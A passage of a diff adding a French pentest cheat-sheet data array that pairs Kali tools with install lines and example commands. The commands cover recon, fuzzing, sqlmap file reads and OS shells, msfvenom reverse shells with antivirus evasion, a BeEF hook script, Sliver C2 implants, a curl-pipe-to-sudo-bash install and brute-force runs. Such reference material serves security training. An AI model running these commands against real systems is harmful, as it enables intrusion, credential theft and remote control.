+   {d:"Scan SYN d'un port",c:"sudo hping3 -S -p 80 CIBLE"},
+   {d:"Test de pare-feu (flags)",c:"sudo hping3 -F -P -U -p 80 CIBLE"},
+   {d:"Ping ICMP",c:"sudo hping3 -1 CIBLE"},
+   {d:"Balayage de ports",c:"sudo hping3 -S --scan 1-1000 CIBLE"},
+   {d:"Traceroute TCP",c:"sudo hping3 -T -S -p 80 CIBLE"}]},
+ {n:"amass",c:"recon",std:1,inst:"sudo apt install amass",r:"Cartographie massive de sous-domaines via des dizaines de sources.",cmds:[
+   {d:"Énumération complète",c:"amass enum -d exemple.com"},
+   {d:"Mode passif (discret)",c:"amass enum -passive -d exemple.com -o sous.txt"},
+   {d:"Mode actif + brute-force",c:"amass enum -active -brute -d exemple.com"},
+   {d:"Interroger la base locale",c:"amass db -d exemple.com -show"},
+   {d:"Visualiser les relations (D3)",c:"amass viz -d3 -d exemple.com"}]},
+ {n:"subfinder",c:"recon",std:0,inst:"sudo apt install subfinder",r:"Énumération passive et rapide de sous-domaines.",cmds:[
+   {d:"Énumérer un domaine",c:"subfinder -d exemple.com -o sous.txt"},
+   {d:"Sortie silencieuse (pipe)",c:"subfinder -d exemple.com -silent"},
+   {d:"Plusieurs domaines",c:"subfinder -dL domaines.txt"},
+   {d:"Chaîner vers httpx",c:"subfinder -d exemple.com -silent | httpx -silent"},
+   {d:"Toutes les sources + récursif",c:"subfinder -d exemple.com -all -recursive"}]},
+ {n:"assetfinder",c:"recon",std:0,inst:"go install github.com/tomnomnom/assetfinder@latest",r:"Trouve domaines et sous-domaines liés à une cible.",cmds:[
+   {d:"Sous-domaines liés",c:"assetfinder exemple.com"},
+   {d:"Seulement le sous-domaine",c:"assetfinder --subs-only exemple.com"}]},
+ {n:"dnsx",c:"recon",std:0,inst:"sudo apt install dnsx",r:"Résolveur DNS rapide : valide, filtre et enrichit des listes de domaines.",cmds:[
+   {d:"Résoudre une liste",c:"dnsx -l sous.txt -resp"},
+   {d:"Filtrer les domaines vivants",c:"subfinder -d exemple.com -silent | dnsx -silent"},
+   {d:"Récupérer les enregistrements A",c:"dnsx -l sous.txt -a -resp-only"},
+   {d:"Brute-force avec wordlist",c:"dnsx -d exemple.com -w wordlist.txt"}]},
+ {n:"theHarvester",c:"recon",std:1,inst:"sudo apt install theharvester",r:"Moissonne e-mails, noms et sous-domaines depuis des sources publiques.",cmds:[
+   {d:"Toutes les sources",c:"theHarvester -d exemple.com -b all"},
+   {d:"Source précise",c:"theHarvester -d exemple.com -b bing"},
+   {d:"Limiter le nombre de résultats",c:"theHarvester -d exemple.com -b all -l 500"},
+   {d:"Exporter (HTML/JSON)",c:"theHarvester -d exemple.com -b all -f rapport"}]},
+ {n:"dnsenum",c:"recon",std:1,inst:"sudo apt install dnsenum",r:"Énumération DNS : enregistrements, transfert de zone, brute-force.",cmds:[
+   {d:"Énumération standard",c:"dnsenum exemple.com"},
+   {d:"Avec dictionnaire",c:"dnsenum -f wordlist.txt exemple.com"},
+   {d:"Threads + sans whois",c:"dnsenum --threads 10 --noreverse exemple.com"}]},
+ {n:"dnsrecon",c:"recon",std:1,inst:"sudo apt install dnsrecon",r:"Reconnaissance DNS avancée et scriptable.",cmds:[
+   {d:"Reconnaissance standard",c:"dnsrecon -d exemple.com -t std"},
+   {d:"Transfert de zone",c:"dnsrecon -d exemple.com -t axfr"},
+   {d:"Brute-force de sous-domaines",c:"dnsrecon -d exemple.com -D wordlist.txt -t brt"},
+   {d:"Résolution inversée d'une plage",c:"dnsrecon -r 192.168.1.0/24"}]},
+ {n:"fierce",c:"recon",std:1,inst:"sudo apt install fierce",r:"Scanner DNS pour localiser les cibles non contiguës d'un domaine.",cmds:[
+   {d:"Scan d'un domaine",c:"fierce --domain exemple.com"},
+   {d:"Avec dictionnaire",c:"fierce --domain exemple.com --subdomain-file wordlist.txt"}]},
+ {n:"recon-ng",c:"recon",std:1,inst:"sudo apt install recon-ng",r:"Framework OSINT modulaire (style Metasploit) avec base de données.",cmds:[
+   {d:"Lancer la console",c:"recon-ng"},
+   {d:"Chercher des modules",c:"marketplace search"},
+   {d:"Installer un module",c:"marketplace install recon/domains-hosts/hackertarget"},
+   {d:"Charger et lancer",c:"modules load recon/domains-hosts/hackertarget ; run"}]},
+ {n:"spiderfoot",c:"recon",std:0,inst:"sudo apt install spiderfoot",r:"Automatisation OSINT massive avec interface web.",cmds:[
+   {d:"Interface web",c:"spiderfoot -l 127.0.0.1:5001"},
+   {d:"Scan en ligne de commande",c:"spiderfoot -s exemple.com -o json"}]},
+ {n:"sherlock",c:"recon",std:0,inst:"pipx install sherlock-project",r:"Retrouve les comptes d'un pseudo sur des centaines de réseaux sociaux.",cmds:[
+   {d:"Chercher un pseudo",c:"sherlock pseudo"},
+   {d:"Plusieurs pseudos",c:"sherlock pseudo1 pseudo2"},
+   {d:"Exporter le résultat",c:"sherlock pseudo -o resultat.txt"}]},
+ {n:"holehe",c:"recon",std:0,inst:"pipx install holehe",r:"Vérifie sur quels sites une adresse e-mail est enregistrée.",cmds:[
+   {d:"Tester un e-mail",c:"holehe cible@exemple.com"},
+   {d:"Seulement les comptes trouvés",c:"holehe cible@exemple.com --only-used"}]},
+ {n:"maltego",c:"recon",std:1,inst:"sudo apt install maltego",r:"Cartographie graphique des relations (personnes, domaines, infra).",cmds:[
+   {d:"Lancer l'application",c:"maltego"}]},
+ {n:"sublist3r",c:"recon",std:0,inst:"sudo apt install sublist3r",r:"Énumère les sous-domaines via les moteurs de recherche.",cmds:[
+   {d:"Énumérer un domaine",c:"sublist3r -d exemple.com"},
+   {d:"Avec brute-force",c:"sublist3r -d exemple.com -b"},
+   {d:"Filtrer par port",c:"sublist3r -d exemple.com -p 80,443"}]},
+ {n:"shodan",c:"recon",std:0,inst:"pipx install shodan",r:"CLI du moteur de recherche des objets connectés exposés.",cmds:[
+   {d:"Initialiser avec la clé API",c:"shodan init VOTRE_CLE_API"},
+   {d:"Rechercher",c:"shodan search apache country:FR"},
+   {d:"Infos sur une IP",c:"shodan host 8.8.8.8"},
+   {d:"Compter les résultats",c:"shodan count product:nginx"}]},
+ {n:"gobuster",c:"web",std:1,inst:"sudo apt install gobuster",r:"Brute-force de répertoires, fichiers, sous-domaines et vhosts.",cmds:[
+   {d:"Répertoires et fichiers",c:"gobuster dir -u http://CIBLE -w wordlist.txt"},
+   {d:"Avec extensions",c:"gobuster dir -u http://CIBLE -w wordlist.txt -x php,txt,html"},
+   {d:"Suivre les redirections",c:"gobuster dir -u http://CIBLE -w w.txt -r"},
+   {d:"Ignorer le certificat HTTPS",c:"gobuster dir -u https://CIBLE -w w.txt -k"},
+   {d:"Masquer des codes",c:"gobuster dir -u http://CIBLE -w w.txt -b 403,404"},
+   {d:"Plus de threads",c:"gobuster dir -u http://CIBLE -w w.txt -t 50"},
+   {d:"Sous-domaines (DNS)",c:"gobuster dns -d exemple.com -w wordlist.txt"},
+   {d:"Virtual hosts",c:"gobuster vhost -u http://CIBLE -w w.txt --append-domain"},
+   {d:"Avec cookie authentifié",c:"gobuster dir -u http://CIBLE -w w.txt -H 'Cookie: session=xxx'"}]},
+ {n:"feroxbuster",c:"web",std:1,inst:"sudo apt install feroxbuster",r:"Découverte de contenu rapide et récursive, écrit en Rust.",cmds:[
+   {d:"Scan récursif",c:"feroxbuster -u http://CIBLE -w wordlist.txt"},
+   {d:"Extensions + profondeur",c:"feroxbuster -u http://CIBLE -x php,html -d 2"},
+   {d:"Filtrer code / taille",c:"feroxbuster -u http://CIBLE -C 404 -S 1234"},
+   {d:"Avec cookie",c:"feroxbuster -u http://CIBLE -H 'Cookie: session=xxx'"},
+   {d:"Ignorer le certificat",c:"feroxbuster -u https://CIBLE -k"},
+   {d:"Reprendre un scan",c:"feroxbuster --resume-from state.json"}]},
+ {n:"ffuf",c:"web",std:1,inst:"sudo apt install ffuf",r:"Fuzzer web ultra-rapide ; le mot-clé FUZZ s'injecte où tu veux.",cmds:[
+   {d:"Fuzz de répertoires",c:"ffuf -u http://CIBLE/FUZZ -w wordlist.txt"},
+   {d:"Avec extensions",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -e .php,.html,.txt"},
+   {d:"Fuzz de sous-domaine (Host)",c:"ffuf -u http://CIBLE -H 'Host: FUZZ.exemple.com' -w sous.txt"},
+   {d:"Fuzz de paramètre GET",c:"ffuf -u 'http://CIBLE/page?FUZZ=1' -w params.txt"},
+   {d:"Brute-force de login (POST)",c:"ffuf -u http://CIBLE/login -X POST -d 'user=admin&pass=FUZZ' -w rockyou.txt"},
+   {d:"Filtrer par code",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -mc 200,301,403"},
+   {d:"Masquer par taille",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -fs 1234"},
+   {d:"Masquer par nb de mots",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -fw 42"},
+   {d:"Avec cookie",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -b 'session=xxx'"},
+   {d:"Récursif + JSON",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -recursion -o out.json"},
+   {d:"Ralentir (discrétion)",c:"ffuf -u http://CIBLE/FUZZ -w w.txt -rate 20 -p 0.1"}]},
+ {n:"dirb",c:"web",std:1,inst:"sudo apt install dirb",r:"Scanner de contenu web classique par dictionnaire.",cmds:[
+   {d:"Scan standard",c:"dirb http://CIBLE"},
+   {d:"Dictionnaire précis",c:"dirb http://CIBLE /usr/share/wordlists/dirb/big.txt"},
+   {d:"Avec extensions",c:"dirb http://CIBLE -X .php,.bak"}]},
+ {n:"dirsearch",c:"web",std:1,inst:"sudo apt install dirsearch",r:"Brute-force de chemins web avec de nombreuses options.",cmds:[
+   {d:"Scan avec extensions",c:"dirsearch -u http://CIBLE -e php,html,txt"},
+   {d:"Exclure des codes",c:"dirsearch -u http://CIBLE -x 403,404"},
+   {d:"Récursif",c:"dirsearch -u http://CIBLE -r"},
+   {d:"Exporter",c:"dirsearch -u http://CIBLE --format=json -o out.json"}]},
+ {n:"wfuzz",c:"web",std:1,inst:"sudo apt install wfuzz",r:"Fuzzer web polyvalent (paramètres, en-têtes, auth).",cmds:[
+   {d:"Fuzz de répertoire",c:"wfuzz -w wordlist.txt --hc 404 http://CIBLE/FUZZ"},
+   {d:"Brute-force de login",c:"wfuzz -w rockyou.txt -d 'user=admin&pass=FUZZ' http://CIBLE/login"},
+   {d:"Masquer par mots",c:"wfuzz -w w.txt --hw 50 http://CIBLE/FUZZ"}]},
+ {n:"whatweb",c:"web",std:1,inst:"sudo apt install whatweb",r:"Identifie CMS, serveur, frameworks et technologies d'un site.",cmds:[
+   {d:"Identification simple",c:"whatweb http://CIBLE"},
+   {d:"Agressivité max",c:"whatweb -a 3 http://CIBLE"},
+   {d:"Plusieurs cibles",c:"whatweb -i urls.txt"}]},
+ {n:"wafw00f",c:"web",std:1,inst:"sudo apt install wafw00f",r:"Détecte la présence et le type de pare-feu applicatif (WAF).",cmds:[
+   {d:"Détecter un WAF",c:"wafw00f http://CIBLE"},
+   {d:"Lister les WAF connus",c:"wafw00f -l"},
+   {d:"Tester tous les WAF",c:"wafw00f http://CIBLE -a"}]},
+ {n:"nuclei",c:"web",std:0,inst:"sudo apt install nuclei",r:"Scanner à templates communautaires pour failles et mauvaises configs.",cmds:[
+   {d:"Scan complet",c:"nuclei -u http://CIBLE"},
+   {d:"Critiques/hautes seulement",c:"nuclei -u http://CIBLE -severity critical,high"},
+   {d:"Liste d'URL",c:"nuclei -l urls.txt"},
+   {d:"Templates CVE",c:"nuclei -u http://CIBLE -t cves/"},
+   {d:"Par tags",c:"nuclei -u http://CIBLE -tags sqli,xss,rce"},
+   {d:"Chaîne recon complète",c:"subfinder -d exemple.com -silent | httpx -silent | nuclei"},
+   {d:"Mettre à jour les templates",c:"nuclei -update-templates"},
+   {d:"Limiter le débit",c:"nuclei -u http://CIBLE -rl 20"},
+   {d:"Exporter en JSON",c:"nuclei -u http://CIBLE -json -o out.json"}]},
+ {n:"httpx",c:"web",std:0,inst:"sudo apt install httpx-toolkit",r:"Sonde des listes d'URL (code, techno, titre) à grande vitesse.",cmds:[
+   {d:"Sonder avec détails",c:"httpx -l urls.txt -title -tech-detect -status-code"},
+   {d:"Garder les vivants",c:"cat sous.txt | httpx -silent"},
+   {d:"Captures d'écran",c:"httpx -l urls.txt -screenshot"},
+   {d:"Suivre les redirections + IP",c:"httpx -l urls.txt -fr -ip"}]},
+ {n:"katana",c:"web",std:0,inst:"sudo apt install katana",r:"Crawler web moderne qui cartographie tous les liens d'un site.",cmds:[
+   {d:"Crawl standard",c:"katana -u http://CIBLE"},
+   {d:"Crawl profond + JS",c:"katana -u http://CIBLE -d 5 -jc"},
+   {d:"Extraire les endpoints JS",c:"katana -u http://CIBLE -jsl"}]},
+ {n:"hakrawler",c:"web",std:0,inst:"go install github.com/hakluke/hakrawler@latest",r:"Crawler rapide pour extraire URL et endpoints.",cmds:[
+   {d:"Crawler une URL",c:"echo http://CIBLE | hakrawler"},
+   {d:"Avec profondeur",c:"echo http://CIBLE | hakrawler -d 3"}]},
+ {n:"gospider",c:"web",std:0,inst:"go install github.com/jaeles-project/gospider@latest",r:"Crawler web rapide qui suit aussi les liens des fichiers JS et sitemaps.",cmds:[
+   {d:"Crawler un site",c:"gospider -s http://CIBLE"},
+   {d:"Profondeur + concurrence",c:"gospider -s http://CIBLE -d 3 -c 10"},
+   {d:"Inclure sources externes",c:"gospider -s http://CIBLE --other-source"}]},
+ {n:"gau",c:"web",std:0,inst:"go install github.com/lc/gau/v2/cmd/gau@latest",r:"Récupère les URL connues d'un domaine (Wayback, etc.).",cmds:[
+   {d:"Toutes les URL connues",c:"gau exemple.com"},
+   {d:"Seulement les paramètres",c:"gau exemple.com | grep '='"}]},
+ {n:"waybackurls",c:"web",std:0,inst:"go install github.com/tomnomnom/waybackurls@latest",r:"Extrait les URL historiques archivées d'un domaine.",cmds:[
+   {d:"URL archivées",c:"waybackurls exemple.com"},
+   {d:"Filtrer les fichiers JS",c:"waybackurls exemple.com | grep '\\.js'"}]},
+ {n:"arjun",c:"web",std:0,inst:"pipx install arjun",r:"Découvre les paramètres HTTP cachés d'un endpoint.",cmds:[
+   {d:"Chercher des paramètres",c:"arjun -u http://CIBLE"},
+   {d:"Méthode POST",c:"arjun -u http://CIBLE -m POST"},
+   {d:"Depuis une liste d'URL",c:"arjun -i urls.txt"}]},
+ {n:"paramspider",c:"web",std:0,inst:"pipx install paramspider",r:"Collecte les paramètres d'URL depuis les archives web.",cmds:[
+   {d:"Collecter les paramètres",c:"paramspider -d exemple.com"}]},
+ {n:"x8",c:"web",std:0,inst:"cargo install x8",r:"Découverte de paramètres cachés par force brute, très précis.",cmds:[
+   {d:"Chercher des paramètres",c:"x8 -u http://CIBLE -w params.txt"},
+   {d:"Méthode POST",c:"x8 -u http://CIBLE -X POST -w params.txt"}]},
+ {n:"gf",c:"web",std:0,inst:"go install github.com/tomnomnom/gf@latest",r:"Filtre des listes d'URL par motifs de vulnérabilité (grep amélioré).",cmds:[
+   {d:"URL potentiellement XSS",c:"gau exemple.com | gf xss"},
+   {d:"Potentiel SSRF",c:"cat urls.txt | gf ssrf"},
+   {d:"Lister les motifs",c:"gf -list"}]},
+ {n:"httprobe",c:"web",std:0,inst:"go install github.com/tomnomnom/httprobe@latest",r:"Teste quelles entrées d'une liste répondent en HTTP/HTTPS.",cmds:[
+   {d:"Tester une liste de domaines",c:"cat sous.txt | httprobe"},
+   {d:"Ports supplémentaires",c:"cat sous.txt | httprobe -p http:8080 -p https:8443"}]},
+ {n:"nikto",c:"webvuln",std:1,inst:"sudo apt install nikto",r:"Scanner de serveur web : fichiers sensibles, versions, configs.",cmds:[
+   {d:"Scan d'un hôte",c:"nikto -h http://CIBLE"},
+   {d:"HTTPS sur port précis",c:"nikto -h CIBLE -p 443 -ssl"},
+   {d:"Plusieurs ports",c:"nikto -h CIBLE -p 80,443,8080"},
+   {d:"Via un proxy (Burp)",c:"nikto -h http://CIBLE -useproxy http://127.0.0.1:8080"},
+   {d:"Catégories de tests précises",c:"nikto -h http://CIBLE -Tuning 1234"},
+   {d:"Exporter le rapport",c:"nikto -h http://CIBLE -o rapport.html -Format htm"}]},
+ {n:"sqlmap",c:"webvuln",std:1,inst:"sudo apt install sqlmap",r:"Détecte et exploite les injections SQL automatiquement.",cmds:[
+   {d:"Tester un paramètre",c:"sqlmap -u 'http://CIBLE/p?id=1'"},
+   {d:"Lister les bases",c:"sqlmap -u 'http://CIBLE/p?id=1' --dbs"},
+   {d:"Lister les tables",c:"sqlmap -u 'http://CIBLE/p?id=1' -D base --tables"},
+   {d:"Lister les colonnes",c:"sqlmap -u 'http://CIBLE/p?id=1' -D base -T users --columns"},
+   {d:"Extraire une table",c:"sqlmap -u 'http://CIBLE/p?id=1' -D base -T users --dump"},
+   {d:"Tout extraire",c:"sqlmap -u 'http://CIBLE/p?id=1' --dump-all"},
+   {d:"Depuis une requête Burp",c:"sqlmap -r requete.txt --batch"},
+   {d:"Utilisateur / BDD / privilèges",c:"sqlmap -u 'http://CIBLE/p?id=1' --current-user --is-dba"},
+   {d:"Avec cookie authentifié",c:"sqlmap -u 'http://CIBLE/p?id=1' --cookie='PHPSESSID=xxx'"},
+   {d:"Niveau et risque max",c:"sqlmap -u 'http://CIBLE/p?id=1' --level=5 --risk=3"},
+   {d:"Contourner un WAF (tamper)",c:"sqlmap -u 'http://CIBLE/p?id=1' --tamper=space2comment"},
+   {d:"Lire un fichier serveur",c:"sqlmap -u 'http://CIBLE/p?id=1' --file-read=/etc/passwd"},
+   {d:"Tenter un shell OS",c:"sqlmap -u 'http://CIBLE/p?id=1' --os-shell"}]},
+ {n:"dalfox",c:"webvuln",std:0,inst:"sudo apt install dalfox",r:"Chasseur de XSS : teste et confirme l'exécution de scripts.",cmds:[
+   {d:"Tester une URL",c:"dalfox url 'http://CIBLE/?q=test'"},
+   {d:"Depuis une liste (pipe)",c:"cat urls.txt | dalfox pipe"},
+   {d:"Avec header d'auth",c:"dalfox url 'http://CIBLE/?q=x' -H 'Cookie: s=xxx'"}]},
+ {n:"xsser",c:"webvuln",std:1,inst:"sudo apt install xsser",r:"Framework de détection et d'exploitation de failles XSS.",cmds:[
+   {d:"Tester une URL",c:"xsser -u 'http://CIBLE/?q=XSS'"},
+   {d:"Interface graphique",c:"xsser --gtk"}]},
+ {n:"commix",c:"webvuln",std:1,inst:"sudo apt install commix",r:"Détecte et exploite les injections de commandes OS.",cmds:[
+   {d:"Tester un paramètre",c:"commix -u 'http://CIBLE/?cmd=test'"},
+   {d:"Depuis une requête",c:"commix -r requete.txt"},
+   {d:"Shell inversé direct",c:"commix -u 'http://CIBLE/?cmd=x' --os-cmd='whoami'"}]},
+ {n:"wpscan",c:"webvuln",std:1,inst:"sudo apt install wpscan",r:"Audit WordPress : thèmes, plugins, utilisateurs, vulnérabilités.",cmds:[
+   {d:"Scan standard",c:"wpscan --url http://CIBLE"},
+   {d:"Users + plugins vulnérables",c:"wpscan --url http://CIBLE --enumerate u,vp"},
+   {d:"Tous les plugins",c:"wpscan --url http://CIBLE --enumerate ap"},
+   {d:"Les thèmes",c:"wpscan --url http://CIBLE --enumerate at"},
+   {d:"Avec clé API (vulns à jour)",c:"wpscan --url http://CIBLE --api-token VOTRE_CLE"},
+   {d:"Brute-force d'un login",c:"wpscan --url http://CIBLE -U admin -P rockyou.txt"},
+   {d:"Détection agressive",c:"wpscan --url http://CIBLE --plugins-detection aggressive"},
+   {d:"User-agent aléatoire",c:"wpscan --url http://CIBLE --random-user-agent"}]},
+ {n:"joomscan",c:"webvuln",std:1,inst:"sudo apt install joomscan",r:"Scanner de vulnérabilités pour sites Joomla.",cmds:[
+   {d:"Scanner un site",c:"joomscan -u http://CIBLE"},
+   {d:"Énumérer les composants",c:"joomscan -u http://CIBLE --enumerate-components"}]},
+ {n:"droopescan",c:"webvuln",std:0,inst:"pipx install droopescan",r:"Scanner pour Drupal, SilverStripe et autres CMS.",cmds:[
+   {d:"Scanner un Drupal",c:"droopescan scan drupal -u http://CIBLE"},
+   {d:"Détection auto du CMS",c:"droopescan scan -u http://CIBLE"}]},
+ {n:"nosqlmap",c:"webvuln",std:0,inst:"git clone github.com/codingo/NoSQLMap",r:"Équivalent de sqlmap pour les bases NoSQL (MongoDB...).",cmds:[
+   {d:"Lancer l'outil",c:"python nosqlmap.py"}]},
+ {n:"jwt_tool",c:"webvuln",std:0,inst:"pipx install jwt-tool",r:"Teste, forge et casse les jetons JWT.",cmds:[
+   {d:"Analyser un token",c:"jwt_tool eyJ...TOKEN"},
+   {d:"Tester les vulns connues",c:"jwt_tool TOKEN -M pb"},
+   {d:"Casser le secret",c:"jwt_tool TOKEN -C -d rockyou.txt"},
+   {d:"Forger (none / alg confusion)",c:"jwt_tool TOKEN -X a"}]},
+ {n:"Burp Suite",c:"proxy",std:1,inst:"sudo apt install burpsuite",r:"Proxy d'interception web de référence (Proxy, Repeater, Intruder).",cmds:[
+   {d:"Lancer l'application",c:"burpsuite"},
+   {d:"Config navigateur : proxy",c:"127.0.0.1:8080"},
+   {d:"Installer le certificat CA depuis",c:"http://burp"},
+   {d:"Workflow : envoyer au Repeater",c:"clic droit → Send to Repeater"}]},
+ {n:"OWASP ZAP",c:"proxy",std:1,inst:"sudo apt install zaproxy",r:"Proxy + scanner web open-source, idéal pour l'automatisation.",cmds:[
+   {d:"Interface graphique",c:"zaproxy"},
+   {d:"Scan auto en console",c:"zap-cli quick-scan http://CIBLE"},
+   {d:"Mode démon (API)",c:"zap.sh -daemon -port 8090"}]},
+ {n:"mitmproxy",c:"proxy",std:1,inst:"sudo apt install mitmproxy",r:"Proxy d'interception en console, scriptable en Python.",cmds:[
+   {d:"Proxy interactif (console)",c:"mitmproxy"},
+   {d:"Interface web",c:"mitmweb"},
+   {d:"Mode avec script",c:"mitmdump -s script.py"},
+   {d:"Mode transparent",c:"mitmproxy --mode transparent"}]},
+ {n:"Metasploit",c:"exploit",std:1,inst:"sudo apt install metasploit-framework",r:"Le framework d'exploitation de référence : exploits, payloads, post-exploitation, le tout en console.",cmds:[
+   {d:"Lancer la console",c:"msfconsole -q"},
+   {d:"Chercher un exploit",c:"search type:exploit eternalblue"},
+   {d:"Sélectionner un module",c:"use exploit/windows/smb/ms17_010_eternalblue"},
+   {d:"Voir les options",c:"show options"},
+   {d:"Définir la cible",c:"set RHOSTS CIBLE"},
+   {d:"Choisir le payload",c:"set PAYLOAD windows/x64/meterpreter/reverse_tcp"},
+   {d:"Définir votre IP d'écoute",c:"set LHOST VOTRE_IP"},
+   {d:"Lancer l'exploit",c:"exploit"},
+   {d:"Scanner avec un module auxiliaire",c:"use auxiliary/scanner/smb/smb_ms17_010"},
+   {d:"Récupérer un handler d'écoute",c:"use exploit/multi/handler"},
+   {d:"Envoyer la session en arrière-plan",c:"background"},
+   {d:"Lister / reprendre les sessions",c:"sessions -i 1"},
+   {d:"Scan nmap intégré à la base",c:"db_nmap -sV CIBLE"}]},
+ {n:"msfvenom",c:"exploit",std:1,inst:"sudo apt install metasploit-framework",r:"L'usine à payloads de Metasploit : génère shells et shellcodes dans tous les formats.",cmds:[
+   {d:"Reverse shell Windows (exe)",c:"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=VOTRE_IP LPORT=4444 -f exe -o shell.exe"},
+   {d:"Reverse shell Linux (elf)",c:"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=VOTRE_IP LPORT=4444 -f elf -o shell.elf"},
+   {d:"Webshell PHP",c:"msfvenom -p php/meterpreter/reverse_tcp LHOST=VOTRE_IP LPORT=4444 -f raw -o shell.php"},
+   {d:"Shell JSP (war)",c:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=VOTRE_IP LPORT=4444 -f war -o shell.war"},
+   {d:"Reverse shell Windows en ligne de commande",c:"msfvenom -p windows/shell_reverse_tcp LHOST=VOTRE_IP LPORT=4444 -f exe -o rev.exe"},
+   {d:"Lister les payloads",c:"msfvenom -l payloads"},
+   {d:"Encoder pour échapper à l'AV",c:"msfvenom -p windows/meterpreter/reverse_tcp LHOST=VOTRE_IP LPORT=4444 -e x86/shikata_ga_nai -i 9 -f exe -o enc.exe"},
+   {d:"Exclure des mauvais caractères",c:"msfvenom -p windows/shell_reverse_tcp LHOST=VOTRE_IP LPORT=4444 -b '\\x00\\x0a\\x0d' -f c"},
+   {d:"Shellcode brut en C",c:"msfvenom -p windows/exec CMD=calc.exe -f c"},
+   {d:"Exécuter une commande (Linux)",c:"msfvenom -p cmd/unix/reverse_bash LHOST=VOTRE_IP LPORT=4444 -f raw"}]},
+ {n:"searchsploit",c:"exploit",std:1,inst:"sudo apt install exploitdb",r:"Le moteur de recherche hors-ligne d'Exploit-DB, en local sur Kali.",cmds:[
+   {d:"Chercher un exploit",c:"searchsploit apache 2.4.49"},
+   {d:"Recherche par titre uniquement",c:"searchsploit -t wordpress"},
+   {d:"Exclure des résultats",c:"searchsploit smb --exclude='dos'"},
+   {d:"Afficher le chemin du fichier",c:"searchsploit -p 50383"},
+   {d:"Copier l'exploit dans le dossier courant",c:"searchsploit -m windows/remote/42315.py"},
+   {d:"Mettre à jour la base",c:"searchsploit -u"},
+   {d:"Sortie JSON",c:"searchsploit -j apache"}]},
+ {n:"BeEF",c:"exploit",std:0,inst:"sudo apt install beef-xss",r:"Le framework qui transforme un navigateur piégé en tête de pont (hook JavaScript).",cmds:[
+   {d:"Lancer le serveur",c:"sudo beef-xss"},
+   {d:"Interface d'administration",c:"http://127.0.0.1:3000/ui/panel"},
+   {d:"Script à injecter dans la cible",c:"<script src=\"http://VOTRE_IP:3000/hook.js\"><\/script>"},
+   {d:"Fichier de configuration",c:"sudo nano /usr/share/beef-xss/config.yaml"},
+   {d:"Réinitialiser identifiants / base",c:"sudo beef-xss-reset"},
+   {d:"API REST (clé de session)",c:"curl -s http://127.0.0.1:3000/api/hooks?token=CLE"}]},
+ {n:"Armitage",c:"exploit",std:0,inst:"sudo apt install armitage",r:"L'interface graphique collaborative de Metasploit, pour visualiser les cibles.",cmds:[
+   {d:"Démarrer le service msf RPC",c:"sudo msfdb init && msfrpcd -P motdepasse"},
+   {d:"Lancer Armitage",c:"sudo armitage"},
+   {d:"Scan réseau (menu Hosts → Nmap Scan)",c:"Hosts → Nmap Scan → Quick Scan"},
+   {d:"Recherche d'attaques automatique",c:"Attacks → Find Attacks"},
+   {d:"Exploitation massive",c:"Attacks → Hail Mary"}]},
+ {n:"Sliver",c:"exploit",std:0,inst:"curl https://sliver.sh/install | sudo bash",r:"Framework C2 moderne (BishopFox) : implants cross-plateformes et furtifs.",cmds:[
+   {d:"Lancer le serveur",c:"sliver-server"},
+   {d:"Générer un implant Windows",c:"generate --mtls VOTRE_IP --os windows --save /tmp/"},
+   {d:"Générer un beacon discret",c:"generate beacon --mtls VOTRE_IP --seconds 60 --os windows"},
+   {d:"Démarrer un listener mTLS",c:"mtls --lhost VOTRE_IP --lport 443"},
+   {d:"Lister les implants connectés",c:"sessions"},
+   {d:"Interagir avec une session",c:"use SESSION_ID"},
+   {d:"Exécuter une commande sur la cible",c:"execute -o whoami"},
+   {d:"Monter un proxy SOCKS",c:"socks5 start"}]},
+ {n:"Villain",c:"exploit",std:0,inst:"git clone https://github.com/t3l3machus/Villain",r:"Générateur de reverse shells avec gestion de sessions multiples et relais entre postes.",cmds:[
+   {d:"Lancer l'outil",c:"python3 Villain.py"},
+   {d:"Générer un payload PowerShell",c:"generate payload=windows_powershell lhost=eth0"},
+   {d:"Lister les shells reçus",c:"sessions"},
+   {d:"Prendre la main sur une session",c:"shell SESSION_ID"},
+   {d:"Relayer vers un poste connecté (sibling)",c:"connect SIBLING_IP 65002"}]},
+ {n:"hydra",c:"pass",std:1,inst:"sudo apt install hydra",r:"Le bélier du brute-force réseau : SSH, FTP, RDP, formulaires web et des dizaines de protocoles.",cmds:[
+   {d:"Brute-force SSH",c:"hydra -l admin -P rockyou.txt ssh://CIBLE"},
+   {d:"FTP avec listes user+pass",c:"hydra -L users.txt -P pass.txt ftp://CIBLE"},
+   {d:"RDP",c:"hydra -l administrator -P pass.txt rdp://CIBLE"},
+   {d:"Formulaire web POST (échec sur 'invalid')",c:"hydra -l admin -P rockyou.txt CIBLE http-post-form '/login:user=^USER^&pass=^PASS^:F=invalid'"},
+   {d:"Auth HTTP basique",c:"hydra -L users.txt -P pass.txt CIBLE http-get /admin"},
+   {d:"SMB",c:"hydra -l administrator -P pass.txt smb://CIBLE"},
+   {d:"Port non standard",c:"hydra -s 2222 -l root -P pass.txt ssh://CIBLE"},
+   {d:"Limiter les tâches (discrétion)",c:"hydra -t 4 -l admin -P rockyou.txt ssh://CIBLE"},
+   {d:"Arrêter au premier succès",c:"hydra -f -l admin -P rockyou.txt ssh://CIBLE"}]},
+ {n:"medusa",c:"pass",std:1,inst:"sudo apt install medusa",r:"Brute-forcer réseau parallèle et modulaire, alternative robuste à hydra.",cmds:[
+   {d:"Brute-force SSH",c:"medusa -h CIBLE -u admin -P rockyou.txt -M ssh"},
+   {d:"Listes user + pass",c:"medusa -H hosts.txt -U users.txt -P pass.txt -M ssh"},
+   {d:"FTP",c:"medusa -h CIBLE -u ftp -P pass.txt -M ftp"},
+   {d:"Lister les modules",c:"medusa -d"},
+   {d:"Arrêter l'hôte au 1er succès",c:"medusa -h CIBLE -u admin -P pass.txt -M ssh -f"},
+   {d:"Nombre de threads",c:"medusa -h CIBLE -u admin -P pass.txt -M ssh -t 5"}]},
+ {n:"ncrack",c:"pass",std:1,inst:"sudo apt install ncrack",r:"Cracker d'authentification réseau signé Nmap, taillé pour la vitesse.",cmds:[
